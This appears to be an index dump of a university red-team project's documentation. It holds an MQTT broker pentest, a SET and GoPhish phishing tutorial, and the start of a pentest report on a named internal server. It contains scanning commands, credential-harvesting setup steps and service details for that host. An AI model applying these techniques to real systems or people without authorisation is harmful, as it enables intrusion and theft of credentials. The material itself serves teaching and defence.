8883) on 10.137.0.149​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#nmap-command-to-scan-mqtt-ports-1883-8883-on-101370149","content":"   Key Details from the Output:​  -p specifies which port or ports to scan. In this case, you are telling Nmap to scan ports 1883 and 8883 only, which are the default ports for the MQTT protocol.Host Status: The host 10.137.0.149 is up, with a latency of 0.015 seconds, indicating a quick response from the host.Port 1883/tcp: This port is open, indicating that the MQTT service is accessible on this port for unencrypted communication.  ","version":"Next","tagName":"h3"},{"title":"Service Version Detection Scan on Port 1883​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#service-version-detection-scan-on-port-1883","content":"   Explanation:​  Service Version Detection (-sV): The -sV option in Nmap tells it to not only check if the port is open but also to attempt to detect the version of the service running on the specified port.Port-Specific Scan (-p 1883): The scan is focused specifically on port 1883, which is the default port for MQTT services.Port 1883 is open: Port 1883 is open, meaning the MQTT service is accessible on thisService: Nmap detected that the service running on port 1883 is Mosquitto, which is a popular MQTT broker.Version: The version of the Mosquitto broker is 1.6.9, providing detailed information about the service.  ","version":"Next","tagName":"h3"},{"title":"Nmap Vulnerability Scan on port 1883 10.137.0.149​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#nmap-vulnerability-scan-on-port-1883-101370149","content":"       Vulnerability Scan (--script vuln): The --script vuln option in Nmap tells it to run a set of scripts that detect common vulnerabilities on the target host. This includes potential issues with various services running on the host.port 1883 (MQTT) was scanned, no vulnerabilities were detected specifically for the MQTT service running on that port. The scan focused on detecting commonly known vulnerabilities across all the open ports but did not flag any issues with the MQTT service on port 1883.  ","version":"Next","tagName":"h3"},{"title":"Aggressive Scanning on Port 1883 Script Detection​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#aggressive-scanning-on-port-1883-script-detection","content":"   Advanced Scan (-A): The -A option in Nmap enables aggressive scanning, which includes OS Detection, Service Version Detection, Script Scanning and Traceroute.Host Status: The host 10.137.0.149 is up, with low latency of 0.010 seconds.Port 1883 (MQTT) Service: The service running on port 1883 is identified as Mosquitto MQTT broker, version 1.6.9.Script Output - mqtt-subscribe: The script gathered real-time information from the broker’s system topics ($SYS/ topics) that provide internal metrics of the broker.  ","version":"Next","tagName":"h3"},{"title":"Mosquitto and Mosquitto Clients Installation​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#mosquitto-and-mosquitto-clients-installation","content":"   The mosquitto -h command provides an overview of the available options for starting and configuring the Mosquitto MQTT broker. We can use these options to customize the broker's behavior, such as setting a config file, changing the port, or running it in the background.    ","version":"Next","tagName":"h3"},{"title":"Output with mqtt-subscribe Script​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#output-with-mqtt-subscribe-script","content":"   Purpose:​  This command scanned the MQTT broker running on port 1883 of the target host 10.137.0.149 and used the mqtt-subscribe script to gather real-time system information by subscribing to MQTT topics, including the $SYS topics, which provide internal broker metrics.  Key Details from the Output:​  Host and Service Information:  Host: redback.it.deakin.edu.au is up, with a very low latency of 0.011 seconds.Service on Port 1883: The service running on port 1883 is Mosquitto, version 1.6.9.  MQTT Topics and Metrics: The script successfully subscribed to various $SYS topics and retrieved detailed metrics about the broker’s status:  Broker Version: $SYS/broker/version: The broker is running Mosquitto version 1.6.9. Broker Uptime: $SYS/broker/uptime: The broker has been running for 1,053,514 seconds (~12 days). Clients: $SYS/broker/clients/connected: Currently, 1 client is connected.$SYS/broker/clients/active: 1 active client.$SYS/broker/clients/total: A total of 34 clients have connected.$SYS/broker/clients/maximum: The maximum number of clients connected at any time was 34. Message Traffic:8 $SYS/broker/messages/received: The broker has received 10,210 messages.$SYS/broker/messages/sent: The broker has sent 9,913 messages.$SYS/broker/publish/messages/sent: 2,682 messages have been published.$SYS/broker/messages/stored: There are 27 stored messages. Load Metrics: $SYS/broker/load/messages/sent/1min: The broker sent an average of 3.65 messages per minute over the last minute.$SYS/broker/load/bytes/sent/5min: 18.26 bytes were sent over the last 5 minutes.$SYS/broker/load/messages/received/1min: The broker received 1.83 messages per minute over the last minute. Other Key Metrics: Subscriptions: $SYS/broker/subscriptions/count: There are 52 active subscriptions.Heap Memory Usage: $SYS/broker/heap/current: The current heap memory usage is 76,160 bytes.Data Transfer: $SYS/broker/bytes/sent: 134,006 bytes have been sent by the broker.$SYS/broker/bytes/received: 258,880 bytes have been received.  Wireshark Network Capture:​      Information from the Captured Packets:​  SYN (Synchronize Packet): Initial connection request from the client to the server (10.137.0.149), indicating the start of a TCP three-way handshake. SYN-ACK (Synchronize-Acknowledge): The server responds to the client's SYN with a SYN-ACK, indicating that it is willing to establish the connection and synchronizing the sequence numbers. TCP ACK: The client acknowledges the server's SYN-ACK, completing the TCP three-way handshake. This opens the connection for data transmission. MQTT Connect: After the TCP connection is established, the client sends an MQTT Connect request to initiate communication with the MQTT broker. This is the start of the MQTT session. MQTT Connect ACK: The MQTT broker acknowledges the connection request by sending a Connect ACK, confirming that the client is successfully connected to the broker and can start subscribing or publishing to topics. MQTT Subscribe and Acknowledgement: The client sends a subscription request to the MQTT broker (likely to topics like $SYS).The broker acknowledges the subscription with an MQTT Subscribe ACK message. MQTT Publish: The broker publishes messages on topics such as SYS/broker/version,SYS/broker/version, SYS/broker/version,SYS/broker/uptime, $SYS/broker/load/messages/sent, etc.The client receives these messages, which include operational statistics and other data related to the broker’s current status. Key Information in Messages: The published messages include important information such as the broker version (mosquitto version 1.6.9), number of active and connected clients, uptime, and load information.Topics like SYS/broker/load/bytes/sent/5min,SYS/broker/load/bytes/sent/5min, SYS/broker/load/bytes/sent/5min,SYS/broker/clients/connected provide detailed statistics on broker performance. QoS (Quality of Service): The messages use QoS level 0 (At most once delivery), meaning messages are delivered on a best-effort basis, with no acknowledgment from the recipient required.  ","version":"Next","tagName":"h3"},{"title":"Subscribing to all topics Listening port​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#subscribing-to-all-topics-listening-port","content":"   The broker at 10.137.0.149 is actively listening on port 1883 as indicated by the Nmap scan results. This means it is ready to accept MQTT connections, print out all messages that are published to any topic, along with their topic names.  Breakdown: mosquitto_sub: This is the command-line tool to subscribe to MQTT topics. It allows you to receive messages published to specific topics on an MQTT broker.-h 10.137.0.149: Specifies the host of the MQTT broker you are connecting to, which is at IP address 10.137.0.149.-p 1883: Specifies the port on which the broker is listening for MQTT traffic. 1883 is the default port for unencrypted MQTT communication.-t '#': Subscribes to all topics. The # wildcard subscribes to every topic on the broker, including system topics ($SYS/) and any custom topics being published.-v: Enables verbose mode, meaning that both the topic name and the message payload will be displayed when a message is received.  ","version":"Next","tagName":"h3"},{"title":"Publishing Non-Persistent Messages in MQTT​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#publishing-non-persistent-messages-in-mqtt","content":"   Publishing the message &quot;Hello MQTT&quot; to the topic &quot;test/topic&quot;.Publishing the message &quot;Test Message&quot; to the same topic &quot;test/topic&quot;.    Subscribes to all topics (# wildcard) on the MQTT broker with verbose mode (-v), which shows both the topic and message payloads when receiving messages.  Wireshark Network Capture:​    Analysis: The client sends the MQTT Connect request after establishing a TCP connection with the broker.ACK (Acknowledgment) packets are exchanged after each publish to confirm the delivery of messages between the client and broker.In the MQTT Publish packets, the message contents such as &quot;Hello MQTT&quot; and &quot;Test Message&quot; are visible in the data field.The broker accepts and relays the messages to the subscribed clients (as seen in the subscription capture), but since QoS 0 (At most once delivery, fire-and-forget) is used, the messages are not stored by the broker. Message Transmission: The messages &quot;Hello MQTT&quot; and &quot;Test Message&quot; are published to the broker and immediately received by the subscribed client.The capture confirms the messages are transmitted in real time, but because QoS 0 is used, the messages are not retained or stored by the broker for future subscribers.  ","version":"Next","tagName":"h3"},{"title":"Real-Time Message Transmission in MQTT with Retention​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#real-time-message-transmission-in-mqtt-with-retention","content":"   Publishing the message &quot;Good Morning MQTT&quot; to the topic &quot;test/topic&quot; with the -r flag, meaning it is a retained message.Publishing the message &quot;Nice to meet you MQTT&quot; to the same topic, also as a retained message.If a message is published with the retained flag set, the broker will store the message even if no subscribers are currently connected. The broker will deliver the retained message to any new subscribers when they connect.      When subscribing to the topic, the retained messages &quot;Good Morning MQTT&quot; and &quot;Nice to meet you MQTT&quot; are immediately delivered to the subscriber because they were stored on the broker as retained messages.  Wireshark Network Capture:​    Key Points:​  Retained Messages: The MQTT messages are marked as retained, meaning that they will remain on the broker until they are overwritten or cleared. Any new subscriber to the test/topic will immediately receive the last retained message.Real-Time Transmission: The retained messages are also transmitted in real time to any current subscribers when published.TCP &amp; MQTT Acknowledgments: The client receives TCP acknowledgments and MQTT ACKs after each message is published, confirming successful transmission.  ","version":"Next","tagName":"h3"},{"title":"Findings:​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#findings","content":" The mqtt-subscribe script provided valuable insights into the internal workings and metrics of the MQTT broker, including traffic, client activity, memory usage, and uptime.Vulnerability Found: The broker at 10.137.0.149 allows anyone to subscribe and publish messages without authentication, it indicates that this broker is misconfigured to allow unauthenticated connections.This would be considered a security risk, as unauthorized users can subscribe to topics, potentially eavesdrop on messages, and perform malicious activities such as publishing unwanted data to the broker.  ","version":"Next","tagName":"h3"},{"title":"Suggestions:​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#suggestions","content":" To mitigate this risk, the MQTT broker should implement: Username/Password Authentication: Require clients to authenticate before subscribing or publishing.TLS/SSL: Encrypt communication between clients and the broker to prevent eavesdropping.Access Control Lists (ACLs): Control which users or clients are allowed to publish or subscribe to specific topics.  ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#conclusion","content":" In conclusion, penetration testing is a critical cybersecurity practice for identifying and addressing vulnerabilities in systems, networks, and applications before they can be exploited. Understanding the security of an MQTT broker is essential, as it can be a target for attacks, making strong security practices like penetration testing important to maintain secure operations. ","version":"Next","tagName":"h3"},{"title":"Phishing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing","content":"","keywords":"","version":"Next"},{"title":"How Phishing Works​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#how-phishing-works","content":" Phishing involves a series of deliberate steps that exploit deception and manipulation to target victims. Understanding this process can help individuals recognize and defend against phishing attacks. Here’s a breakdown of how a typical phishing attack unfolds:  Preparation and Targeting: Attackers start by identifying their potential victims. This may involve collecting information such as email addresses, job roles, and affiliations. They often utilize social media and other online resources to gather insights about their targets, making their messages more credible. Crafting the Message: After pinpointing the target, attackers create a fraudulent message that appears to come from a legitimate source. This could be a bank, government agency, or well-known online service. The messages often use urgent language to provoke quick action, compelling the recipient to respond without careful consideration. Delivery: The phishing email is sent to the victim. Attackers may employ various strategies to evade spam filters and ensure their messages reach inboxes. This can involve using legitimate email addresses, spoofing sender information, or leveraging botnets to disseminate phishing emails on a large scale. Engagement: When the target receives the email, they may be prompted to click on a link or download an attachment. The link typically directs the victim to a counterfeit website that mimics the legitimate site of the impersonated organization. Here, victims may be asked to provide sensitive information, such as usernames, passwords, or financial details. Exploitation: If the target is deceived and submits their information, the attacker captures this data for malicious purposes. This can result in unauthorized access to the victim's accounts, identity theft, or financial fraud. In some instances, downloading an infected attachment may lead to the installation of malware on the victim’s device. Maintaining Access: Once the attacker has obtained the victim's information, they may establish ongoing access to the victim’s accounts or systems, allowing them to exploit the stolen credentials further or launch additional attacks on the victim's contacts. Further Attacks: With access to the victim’s data, attackers can engage in various malicious activities, such as stealing money, sending more phishing emails to the victim's contacts, or selling the stolen information on the dark web.  ","version":"Next","tagName":"h2"},{"title":"Email Phishing​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#email-phishing","content":" Email phishing is a cyber-attack method that involves sending fraudulent emails designed to deceive recipients into revealing sensitive information, such as usernames, passwords, or financial details. These emails often appear to come from reputable sources, such as banks, online services, or trusted organizations, making them seem legitimate. Phishing emails typically include urgent messages prompting the recipient to click on a link or download an attachment, leading them to fake websites or installing malware. The primary goal of email phishing is to manipulate individuals into providing their personal information or compromising their systems, which attackers can then exploit for various malicious purposes. Understanding email phishing is crucial, especially for practical exercises aimed at identifying and defending against such attacks.  ","version":"Next","tagName":"h2"},{"title":"Tools for Email Phishing​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#tools-for-email-phishing","content":" Gophish Gophish is a user-friendly, open-source phishing framework that allows users to create and manage phishing campaigns. It provides an intuitive interface for designing emails and tracking engagement, making it ideal for ethical phishing simulations and security training. Social-Engineering Toolkit (SET) The Social-Engineering Toolkit (SET) is an open-source framework for penetration testing that simulates social engineering attacks, particularly phishing. It enables security professionals to create realistic phishing emails and replicate websites for credential harvesting, helping organizations assess their defenses against such threats. With its user-friendly interface, SET is widely used in penetration testing and security training. Always obtain proper authorization before use to avoid legal issues.  ","version":"Next","tagName":"h2"},{"title":"How it Works:​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#how-it-works","content":"   ","version":"Next","tagName":"h2"},{"title":"Email Phishing: A Systematic Analysis​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#email-phishing-a-systematic-analysis","content":" Introduction: Email phishing remains a significant threat in the realm of cybersecurity. This paper aims to elucidate the step-by-step process through which these attacks are conducted, providing insights into their methodology and potential impact.  Methodology: The email phishing process typically follows a structured approach:  Email Fabrication: Attackers craft deceptive emails that closely mimic legitimate communications from trusted entities such as financial institutions or popular online services. Mass Distribution: These fraudulent emails are disseminated to a large number of potential victims, often utilizing stolen or purchased email lists. Urgency Creation: The content of these emails often incorporates language designed to instill a sense of urgency, compelling recipients to take immediate action. Malicious Link Inclusion: A critical component of these emails is the inclusion of a hyperlink that directs users to a fraudulent website. Fraudulent Website Construction: The linked website is meticulously designed to replicate the appearance and functionality of legitimate sites, enhancing the deception. Data Acquisition: When users input sensitive information into these fraudulent sites, it is immediately captured by the attackers. Information Exploitation: The collected data is subsequently utilized for various malicious purposes, including identity theft and financial fraud.  ","version":"Next","tagName":"h3"},{"title":"PRACTICAL USAGE OF SOCIAL ENGINEERING TOOLKIT (SET):​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#practical-usage-of-social-engineering-toolkit-set","content":" Here is a demonstration of how setoolkit is used to do credential harvesting:    ","version":"Next","tagName":"h2"},{"title":"SET Interface​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#set-interface","content":"   The demonstration begins with the Social-Engineering Toolkit (SET) interface displayed in Kali Linux. This user-friendly tool provides various options for executing social engineering attacks, making it accessible for users to select specific attack types. The intuitive layout enables quick navigation through the toolkit’s features.  Key features: Offers multiple attack vectors.Facilitates the selection of specific phishing methods.  ","version":"Next","tagName":"h3"},{"title":"Website Attack Vectors​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#website-attack-vectors","content":"   After launching SET, the first action is to select &quot;Website Attack Vectors.&quot; This option is crucial for initiating a phishing attack, as it enables the user to create or exploit a website. By choosing this option, I set the stage for simulating a real-world attack scenario.  Importance: Allows for cloning legitimate websites.Essential for executing phishing attacks.  ","version":"Next","tagName":"h3"},{"title":"Credential Harvester Attack Method​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#credential-harvester-attack-method","content":"   Following the selection of website attack vectors, the next step involves choosing the &quot;Credential Harvester Attack Method.&quot; This method is fundamental for capturing user credentials entered on the cloned site. It showcases how attackers can gather sensitive information by deceiving users into providing their details on a fraudulent page.  Significance: Captures usernames and passwords.Simulates real phishing tactics.  ","version":"Next","tagName":"h3"},{"title":"Entering the IP Address​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#entering-the-ip-address","content":"   Next, I entered my Kali Linux IP address (192.168.1.120) into SET. This step is critical, as the IP address ensures that any data entered on the cloned site is directed back to my machine. Properly configuring the IP address allows for successful demonstration and analysis of the phishing technique.  Purpose: Directs captured data to the attacker’s machine.Essential for the functionality of the cloned site.  ","version":"Next","tagName":"h3"},{"title":"Cloning the Vulnerable Website​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#cloning-the-vulnerable-website","content":"   The demonstration proceeds with cloning a vulnerable website, specifically http://testphp.vulnweb.com/. This site was chosen for its harmlessness, allowing me to effectively simulate an attack without legal or ethical concerns. Cloning a legitimate login page serves to illustrate how attackers can trick users into entering sensitive information.  Chosen site: http://testphp.vulnweb.com/ for safe demonstration.Mimics real-world phishing scenarios.  ","version":"Next","tagName":"h3"},{"title":"Displaying the Cloned Website​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#displaying-the-cloned-website","content":"   Finally, the cloned website is displayed in a web browser. The appearance of the cloned site closely mirrors that of the original, enhancing the realism of the phishing attempt. Any credentials entered on this page would be captured and displayed in the SET interface. This step emphasizes the risks associated with phishing attacks and the importance of user vigilance.  Key takeaway: Cloned site appears authentic, increasing the likelihood of successful phishing.Demonstrates the effectiveness of phishing techniques.  Through this demonstration, I aim to raise awareness about the vulnerabilities present in online security. By showcasing the process of cloning a website and capturing user credentials using SET, I hope to highlight the dangers of phishing attempts and the necessity for individuals to verify the authenticity of websites before entering sensitive information.  ","version":"Next","tagName":"h3"},{"title":"GO PHISH tutorial​","type":1,"pageTitle":"Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/phishing#go-phish-tutorial","content":" GoPhish is an open-source phishing framework for simulating phishing attacks and training cybersecurity teams. It allows the creation of phishing campaigns, custom emails, and landing pages to test user awareness.  How to use:  Creating a Group in GoPhish  Log in to your GoPhish dashboard.On the left-hand menu, click on Groups.Click New Group to create a new group.In the Name field, enter the name for your group.Manually enter the details for each recipient in the table with columns like First Name, Last Name, Email, and Position.  Creating an Email Template in GoPhish  Access the GoPhish dashboard.From the left menu, select Email Templates.Click New Template to start creating a new template.Enter a name in the Name field for your email template.Input the subject line in the Subject field.Use the HTML or Text editor to write the email content, and you can include placeholders for personalized details.Attach any files if necessary.Click Save Template to finalize and save your template.  Creating a Landing Page in GoPhish  Go to the GoPhish dashboard.Click on Landing Pages in the left menu.Select New Landing Page to start.Fill in the Name field with a name for your landing page.Choose a template or start from scratch.Utilize the HTML editor to design your landing page content and add any necessary input fields.Click Save Landing Page to save your changes and finish the setup  Creating a Sending Profile in GoPhish  Navigate to the GoPhish dashboard.Click on Sending Profiles in the left sidebar.Select New Sending Profile to create a new profile.Fill in the Name field with a name for your sending profile.Choose the Email Address that will appear as the sender.Enter the SMTP Server details: Specify the SMTP server address.Provide the SMTP server portInclude the username and password for authentication.If applicable, check the box for Use TLS or Use SSL to secure the connection. Click Save Sending Profile to finish creating your profile.  After completing the setup above. Now click on campaign and start a new one. Use the profiles already created and launch a campaign. After launching, the profiles should receive the email with phishing link: ","version":"Next","tagName":"h2"},{"title":"Redback Pentest Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest","content":"","keywords":"","version":"Next"},{"title":"1. EXECUTIVE SUMMARY​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#1-executive-summary","content":" This penetration test evaluated the security of the Deakin University server (redback.it.deakin.edu.au, IP: 10.137.0.149) and identified several critical issues:  Apache Vulnerabilities: The Apache HTTP Server (v2.4.41) on port 8080 has severe vulnerabilities (CVE-2024-38476, CVE-2024-38474) that could enable remote code execution or denial of service.Weak Authentication: Default credentials on MinIO Console (port 9001) allowed unauthorized access and privilege escalation.SSL/TLS Misconfigurations: Problems included incomplete certificate chains, domain mismatches, and LOGJAM vulnerability (CVE-2015-4000).Exposed Files: Sensitive backup and certificate files were found, risking data exposure.Content Security Policy Issues: On port 443, the policy permits 'unsafe-eval' and 'unsafe-inline', making it vulnerable to cross-site scripting.No HSTS: The absence of HTTP Strict Transport Security leaves the server susceptible to downgrade attacks and cookie hijacking.  ","version":"Next","tagName":"h2"},{"title":"Key Recommendations:​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#key-recommendations","content":" Update Apache HTTP Server to the latest stable version.Strengthen authentication with unique passwords and enable multi-factor authentication.Fix SSL/TLS configurations and implement HSTS.Remove or secure sensitive files.Improve Content Security Policy to restrict unsafe practices.Perform regular vulnerability scans and penetration testing.  The ease of unauthorized access highlights the urgent need for a comprehensive security overhaul to protect Deakin University's digital assets.  ","version":"Next","tagName":"h3"},{"title":"2. Introduction​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#2-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Scope​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#21-scope","content":" This penetration test targeted the Deakin University server redback.it.deakin.edu.au (IP: 10.137.0.149). The assessment focused solely on this server, its services, and associated ports.  ","version":"Next","tagName":"h3"},{"title":"2.2 Objectives​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#22-objectives","content":" The test aimed to:  Evaluate the server's security posture.Identify vulnerabilities.Assess current security measures.Provide improvement recommendations.  ","version":"Next","tagName":"h3"},{"title":"Key Tasks Included:​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#key-tasks-included","content":" Initial ping and host scan.Port scanning and service detection.OS identification.Vulnerability scanning.Focused analysis of ports 8080, 443, and 9000.  ","version":"Next","tagName":"h3"},{"title":"2.3 Methodology​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#23-methodology","content":" The test followed these steps:  Reconnaissance: Non-intrusive information gathering.Scanning: Identifying open ports, services, and potential vulnerabilities.Vulnerability Analysis: Assessing discovered weaknesses.Exploitation: (If authorized) Attempting to exploit vulnerabilities.Reporting: Documenting findings and recommendations.  Industry-standard tools and methods were used, prioritizing minimal disruption to server operations. Testing was conducted with Deakin University's permission and in compliance with relevant regulations.  ","version":"Next","tagName":"h3"},{"title":"3. INFORMATION GATHERING​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#3-information-gathering","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Initial Ping​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#31-initial-ping","content":"   ","version":"Next","tagName":"h3"},{"title":"3.2 Host Scan​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#32-host-scan","content":"   ","version":"Next","tagName":"h3"},{"title":"3.3 Port, Service, and OS Detection​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#33-port-service-and-os-detection","content":"   Nmap Command Used:​  Nmap Command Used:  nmap -sV -p- -A 10.137.0.149  ","version":"Next","tagName":"h3"},{"title":"Scan Results​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#scan-results","content":" Host: 10.137.0.149 (redback.it.deakin.edu.au)  Status: Host is up (0.053s latency)  ","version":"Next","tagName":"h2"},{"title":"Open Ports and Services​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#open-ports-and-services","content":" Port 22/tcp Service: SSHVersion: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)Host Keys: RSA: 67:1a:44:c2:d4:1a:5e:4b:30:7e:59:18:14:b5:fb:59ECDSA: 71:df:6f:48:bf:c1:95:15:e4:c6:ce:0e:b4:16:e8:f8ED25519: d8:e1:08:77:9c:ff:f4:af:2f:bf:7f:60:9d:f8:39:72 Port 25/tcp Service: SMTPVersion: Cisco PIX sanitized smtpdSSL Certificate: Subject: commonName=redback1Subject Alternative Name: DNSValidity: From 2024-09-01 to 2034-08-30 SMTP Commands: PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN Port 80/tcp Service: HTTPVersion: Tornado httpd 6.4.1HTTP Title: StreamlitHTTP Server Header: TornadoServer/6.4.1 Port 443/tcp Service: HTTPS (SSL)SSL Certificate: Subject: commonName=wazuh.dashboard/organizationName=Wazuh/countryName=USSubject Alternative Name: DNS.dashboardValidity: From 2024-05-11 to 2034-05-09 HTTP Responses: 401 Unauthorized: Authentication required302 Found: Redirect to /app/login?404 Not Found: Resource not found Port 1514/tcp Service: Fujitsu DTCNS? (Not Identified) Port 1515/tcp Service: TCP Wrapped (Not Identified) Port 1883/tcp Service: MQTT (Mosquitto)Version: 1.6.9MQTT Topics and Payloads: $SYS/broker/version: mosquitto version 1.6.9$SYS/broker/load/publish/sent/5min: 0.49$SYS/broker/load/messages/sent/5min: 0.73Additional metrics on broker load Port 5000/tcp Service: UPnP? (Not Identified)HTTP Responses: 404 Not Found400 Bad Request: Errors related to request syntax Port 5001/tcp Service: HTTPVersion: Werkzeug httpd 1.0.1 (Python 3.9.19)HTTP Title: 404 Not FoundHTTP Server Header: Werkzeug/1.0.1 Python/3.9.19 Port 5003/tcp  Service: FileMaker? (Not Identified)HTTP Responses: 200 OK: Welcome message200 OK: Allows GET, HEAD, OPTIONS methods  Port 8080/tcp  Service: HTTPVersion: Apache httpd 2.4.41 (Ubuntu)HTTP Title: Apache2 Ubuntu Default Page: It worksHTTP Server Header: Apache/2.4.41 (Ubuntu)HTTP Open Proxy: Proxy might be redirecting requests  Port 8888/tcp  Service: HTTPVersion: Tornado httpd 6.3.3HTTP Title: Jupyter ServerHTTP Server Header: TornadoServer/6.3.3  Port 9000/tcp  Service: CSListener? (Not Identified)HTTP Responses: 400 Bad Request: Various error responses200 OK: MinIO Console  Port 9001/tcp  Service: TOR OR Port? (Not Identified)HTTP Responses: 400 Bad Request: Various error responses200 OK: MinIO Console  Port 9047/tcp  Service: UnknownHTTP Responses: 200 OK: Dremio-related contentVarious Headers: Content-Security-Policy, X-Content-Type-Options, etc.  ","version":"Next","tagName":"h2"},{"title":"4. Vulnerability Scan Assessment​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#4-vulnerability-scan-assessment","content":" ","version":"Next","tagName":"h3"},{"title":"4.1. Vulnerability Scanning Results​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#41-vulnerability-scanning-results","content":"   Nmap Vulnerability Scan Report  Command Used::nmap -p 22,25,80,443,1883,5001,8080,8888,9000,9047 --script=vuln --script-args mincvss=5 --script-timeout=60m 10.137.0.149  Port 25 (SMTP)  State: OpenVulnerabilities: Anonymous Diffie-Hellman Key Exchange MitM VulnerabilityState: VULNERABLEDescription: The server uses anonymous Diffie-Hellman key exchange, which is vulnerable to man-in-the-middle attacks. This can compromise the confidentiality and integrity of data exchanged over the session.Details: Cipher Suite: TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHAModulus Length: 2048Generator Length: 8 References: RFC 2246SMTP Vulnerability: CVE-2010-4344 State: NOT VULNERABLEDescription: The SMTP server is not affected by CVE-2010-4344, which involves a vulnerability in the Exim mail server.  Port 80 (HTTP)  State: OpenVulnerabilities: Slowloris DOS AttackState: LIKELY VULNERABLEDescription: The server may be susceptible to Slowloris attacks, which attempt to keep many connections open and exhaust server resources, leading to a denial of service.References: CVE-2007-6750Slowloris Exploit Checks: DOM Based XSS: Not foundStored XSS: Not foundCSRF: Not found  Port 443 (HTTPS)  State: OpenVulnerabilities: Authentication Bypass by HTTP Verb TamperingState: VULNERABLE (Exploitable)Description: The server is vulnerable to authentication bypass through HTTP verb tampering, allowing unauthorized access to protected resources.Details: Suspected Vulnerable URI: / %5C1quot [POST] References: Imperva GlossaryOWASP Checks: DOM Based XSS: Not foundStored XSS: Not foundCSRF: Not found  Other Ports  Port 1883 (MQTT)State: OpenPort 5001 (Commplex-Link)State: OpenPort 8080 (HTTP-Proxy)State: OpenPort 8888 (Sun-Answerbook)State: OpenPort 9000 (CSListener)State: OpenPort 9047 (Unknown)State: Open  ","version":"Next","tagName":"h3"},{"title":"5. Detailed Findings​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED 